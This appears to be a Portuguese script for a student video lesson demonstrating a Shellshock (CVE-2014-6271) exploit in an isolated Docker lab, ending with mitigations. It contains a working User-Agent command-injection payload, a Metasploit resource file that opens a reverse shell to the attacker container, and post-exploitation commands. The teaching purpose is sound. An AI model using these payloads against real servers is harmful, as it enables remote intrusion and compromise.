# Roteiro da videoaula - Shellshock com Metasploit

Duracao alvo: 20 minutos  
Formato: apresentacao dividida entre 3 pessoas  
Tema: exploracao controlada da vulnerabilidade Shellshock (CVE-2014-6271) com
Apache CGI, Docker e Metasploit

## Divisao geral

- Pessoa 1: introducao, conceito da vulnerabilidade e padrao de ataque
- Pessoa 2: ambiente Docker, vitima, validacao normal e prova manual
- Pessoa 3: Metasploit, shell reversa, mitigacoes e fechamento

## Preparacao antes de gravar

Deixar o laboratorio pronto ou iniciar a gravacao com o build:

```bash
docker compose up --build
```

Usar outro terminal para os comandos `docker exec`.

Arquivos que podem ser deixados abertos no editor:

- `README.md`
- `docs/relatorio.md`
- `docker-compose.yml`
- `victim/Dockerfile`
- `victim/cgi/status.cgi`
- `metasploit/shellshock.rc`

## 0:00 - 1:00 | Abertura

Responsavel: Pessoa 1

### O que mostrar

- Tela do projeto no editor.
- `README.md` ou estrutura de arquivos.

### Fala sugerida

Neste video vamos apresentar um pentest em ambiente controlado usando
Metasploit. O ataque escolhido explora a vulnerabilidade Shellshock,
identificada como CVE-2014-6271.

Nosso laboratorio tem dois containers: uma maquina atacante com Metasploit e
uma vitima com Apache CGI executando um script por uma versao vulneravel do
Bash. A demonstracao sera feita apenas nessa rede isolada de laboratorio.

Ao longo do video vamos explicar o conceito da falha, mostrar a validacao
manual, executar o exploit via Metasploit e finalizar com estrategias de
mitigacao.

## 1:00 - 4:00 | Conceito da vulnerabilidade

Responsavel: Pessoa 1

### O que mostrar

- Secao de vulnerabilidade em `docs/relatorio.md`.
- Padrao Shellshock:

```text
() { :;}; comando_malicioso
```

### Fala sugerida

Shellshock e uma vulnerabilidade do GNU Bash. Ela acontece em versoes que
importam variaveis de ambiente de forma insegura. O Bash permite exportar
funcoes por variaveis de ambiente, mas as versoes vulneraveis tambem executam
comandos extras colocados depois da definicao da funcao.

O padrao do ataque e este:

```text
() { :;}; comando_malicioso
```

A primeira parte parece uma funcao. O problema e que o trecho depois do ponto e
virgula tambem pode ser interpretado e executado.

No nosso caso, a superficie vulneravel e o Apache CGI. Em CGI, cabecalhos HTTP
como `User-Agent`, `Cookie` e `Referer` podem virar variaveis de ambiente, como
`HTTP_USER_AGENT`. Se o CGI for executado por um Bash vulneravel, um dado vindo
do cabecalho HTTP pode virar comando no servidor.

### Transicao para Pessoa 2

Agora que o conceito do Shellshock foi explicado, vamos mostrar como montamos o
ambiente controlado para reproduzir a falha.

## 4:00 - 6:30 | Ambiente controlado

Responsavel: Pessoa 2

### O que mostrar

- `docker-compose.yml`
- `victim/Dockerfile`
- `victim/cgi/status.cgi`

### Pontos para comentar

- Atacante: `172.28.0.10`
- Vitima: `172.28.0.20`
- Rede: `pentest_net`
- A rede e interna.
- A vitima usa Apache CGI e Bash vulneravel.

### Fala sugerida

O laboratorio foi criado com Docker Compose. Temos o container `attacker`, que
usa uma imagem baseada no Metasploit Framework, e o container `victim`, que
executa Apache com CGI habilitado.

O atacante usa o IP `172.28.0.10`, e a vitima usa o IP `172.28.0.20`. Os dois
ficam na rede `pentest_net`, configurada como interna. Isso limita a
demonstracao ao ambiente do trabalho.

Na vitima, o script `status.cgi` e interpretado por uma versao vulneravel do
Bash. Esse script e o endpoint que sera acessado pelo atacante.

### Comando

```bash
docker compose up --build
```

### Saida observada

```text
[+] up 4/4
Image shellshock-victim:local   Built
Image metasploit-attacker:local Built
Container attacker              Recreated
Container victim                Recreated
Attaching to attacker, victim
```

### Observacao

Se aparecer o aviso abaixo, explicar que ele nao impede o laboratorio:

```text
apache2: Could not reliably determine the server's fully qualified domain name
```

## 6:30 - 8:30 | Validacao normal da vitima

Responsavel: Pessoa 2

### O que mostrar

- Terminal com comando `curl`.

### Comando

```bash
docker exec -it attacker curl http://172.28.0.20/cgi-bin/status.cgi
```

### Saida observada

```text
Shellshock lab victim
CGI script executed as: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Server time: Mon Jun 15 17:05:15 UTC 2026
```

### Fala sugerida

Antes de explorar, verificamos se a vitima esta acessivel. A resposta mostra
que o CGI executou corretamente e que ele roda como `www-data`, usuario comum
do servidor web.

Essa informacao e importante porque mostra o nivel de privilegio que o atacante
tera caso consiga executar comandos. O ataque compromete o processo web, mas
nao fornece root automaticamente.

## 8:30 - 11:00 | Prova manual da vulnerabilidade

Responsavel: Pessoa 2

### O que mostrar

- Terminal com `curl` usando `User-Agent` malicioso.
- Checagem do arquivo criado na vitima.

### Comandos

```bash
docker exec -it attacker curl -H 'User-Agent: () { :;}; /bin/touch /tmp/shellshock-proof' http://172.28.0.20/cgi-bin/status.cgi
docker exec -it victim ls -l /tmp/shellshock-proof
```

### Saidas observadas

```text
500 Internal Server Error
```

```text
-rw-r--r-- 1 www-data www-data 0 Jun 15 17:05 /tmp/shellshock-proof
```

### Fala sugerida

Aqui fazemos a prova manual da falha. O cabecalho `User-Agent` recebe o padrao
do Shellshock e, depois dele, o comando `/bin/touch /tmp/shellshock-proof`.

O Apache respondeu `500 Internal Server Error`, mas isso nao significa que a
exploracao falhou. A prova e o segundo comando: o arquivo foi criado dentro da
vitima e pertence ao usuario `www-data`.

Isso confirma que o conteudo do cabecalho HTTP foi transformado em variavel de
ambiente, interpretado pelo Bash vulneravel e executado como comando no
servidor.

### Transicao para Pessoa 3

Agora que a vulnerabilidade foi comprovada manualmente, vamos automatizar a
exploracao usando o Metasploit.

## 11:00 - 13:00 | Configuracao do Metasploit

Responsavel: Pessoa 3

### O que mostrar

- Arquivo `metasploit/shellshock.rc`.

### Conteudo do arquivo

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 172.28.0.20
set RPORT 80
set TARGETURI /cgi-bin/status.cgi
set TARGET 0
set PAYLOAD generic/shell_reverse_tcp
set LHOST 172.28.0.10
set LPORT 4444
check
run
```

### Fala sugerida

O modulo usado no Metasploit e
`exploit/multi/http/apache_mod_cgi_bash_env_exec`. Ele foi feito para explorar
injecao de comandos em variaveis de ambiente no Apache CGI.

O `RHOSTS` e o alvo, ou seja, a vitima no IP `172.28.0.20`. O `TARGETURI`
aponta para `/cgi-bin/status.cgi`, que e o CGI vulneravel.

O payload usado e `generic/shell_reverse_tcp`. Ele faz a vitima iniciar uma
conexao de volta para o atacante. Por isso configuramos `LHOST` como
`172.28.0.10`, que e o IP do container atacante, e `LPORT` como `4444`.

## 13:00 - 16:00 | Execucao do exploit

Responsavel: Pessoa 3

### O que mostrar

- Terminal executando o Metasploit.

### Comando

```bash
docker exec -it attacker /usr/src/metasploit-framework/msfconsole -r /workspace/metasploit/shellshock.rc
```

### Saida observada

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 172.28.0.20
set RPORT 80
set TARGETURI /cgi-bin/status.cgi
set TARGET 0
set PAYLOAD generic/shell_reverse_tcp
set LHOST 172.28.0.10
set LPORT 4444
check
[+] 172.28.0.20:80 - The target is vulnerable.
run
[*] Started reverse TCP handler on 172.28.0.10:4444
[*] Command Stager progress - 100.00% done (817/817 bytes)
[*] Command shell session 1 opened (172.28.0.10:4444 -> 172.28.0.20:40536)
```

### Fala sugerida

O Metasploit primeiro executa o `check`, que confirmou que o alvo e vulneravel.
Depois, ao executar o `run`, ele iniciou o handler da shell reversa no atacante,
enviou o stager para a vitima e abriu a sessao.

A linha mais importante para a demonstracao e:

```text
Command shell session 1 opened
```

Ela confirma que o exploit via Metasploit funcionou e que uma shell foi aberta
entre a vitima e o atacante.

Se o Metasploit voltar para o prompt `msf6`, entrar na sessao com:

```text
sessions -i 1
```

## 16:00 - 17:30 | Demonstracao da shell obtida

Responsavel: Pessoa 3

### O que mostrar

- Comandos dentro da sessao.

### Comandos

```bash
id
hostname
pwd
cat /etc/os-release
```

### Fala sugerida

Com a sessao aberta, esses comandos sao executados na vitima. O `id` deve
mostrar o usuario `www-data`, confirmando que obtivemos execucao remota com os
privilegios do processo web.

O `hostname` ajuda a mostrar que estamos no container da vitima, e
`cat /etc/os-release` identifica o sistema usado no laboratorio.

Esse acesso nao e root, mas ja representa comprometimento do servidor web. Em
um ambiente real, um atacante poderia usar esse ponto inicial para coletar
arquivos acessiveis, baixar outros payloads ou tentar escalar privilegios.

## 17:30 - 19:15 | Mitigacoes e defesas

Responsavel: Pessoa 3

### O que mostrar

- Secao 8 do `docs/relatorio.md`.

### Fala sugerida

A defesa principal contra Shellshock e atualizar o Bash. Sistemas corrigidos
nao executam comandos extras depois de uma definicao de funcao em variaveis de
ambiente.

Outra medida importante e remover ou restringir CGI. CGI aumenta a superficie
de ataque porque transforma informacoes da requisicao HTTP em variaveis de
ambiente.

Tambem e essencial aplicar o principio do menor privilegio. No nosso
laboratorio, o comando executou como `www-data`, o que limita o impacto inicial.

Defesas complementares incluem WAF ou reverse proxy para filtrar cabecalhos
suspeitos, restricao de conexoes de saida para dificultar shells reversas,
segmentacao de rede, monitoramento de logs HTTP e hardening com AppArmor,
SELinux ou seccomp.

## 19:15 - 20:00 | Fechamento

Responsavel: Pessoa 1

### O que mostrar

- `README.md`
- `docs/relatorio.md`
- `docs/roteiro-video.md`

### Fala sugerida

Neste trabalho, demonstramos o ciclo completo de um ataque Shellshock em
ambiente controlado. Primeiro explicamos a falha no Bash e sua relacao com CGI.
Depois validamos manualmente a vulnerabilidade criando um arquivo na vitima.
Por fim, usamos o Metasploit para abrir uma shell reversa.

O ponto central e que um dado vindo do cliente, como o cabecalho `User-Agent`,
foi tratado como variavel de ambiente e interpretado por uma versao vulneravel
do Bash.

Como conclusao, a defesa mais efetiva e atualizar o Bash, remover superficies
desnecessarias como CGI e aplicar camadas complementares de protecao e
monitoramento.

## Checklist por pessoa

### Pessoa 1

- Abrir apresentacao.
- Explicar Shellshock.
- Explicar o padrao `() { :;}; comando`.
- Fazer o fechamento.

### Pessoa 2

- Explicar `docker-compose.yml`.
- Mostrar atacante, vitima, IPs e rede interna.
- Executar validacao normal com `curl`.
- Executar prova manual com `User-Agent`.
- Explicar o `500 Internal Server Error` e o arquivo criado.

### Pessoa 3

- Explicar `metasploit/shellshock.rc`.
- Executar o Metasploit.
- Mostrar `The target is vulnerable`.
- Mostrar `Command shell session 1 opened`.
- Entrar na sessao, se necessario.
- Executar comandos demonstrativos.
- Explicar mitigacoes.

## Checklist tecnico antes da gravacao

- Confirmar que o Docker esta usando o contexto correto.
- Subir o laboratorio com `docker compose up --build`.
- Abrir um segundo terminal para os comandos `docker exec`.
- Confirmar que `curl http://172.28.0.20/cgi-bin/status.cgi` responde.
- Confirmar que `/tmp/shellshock-proof` pode ser criado.
- Confirmar que o Metasploit abre a shell reversa.
- Manter os arquivos `README.md`, `relatorio.md` e `shellshock.rc` abertos.

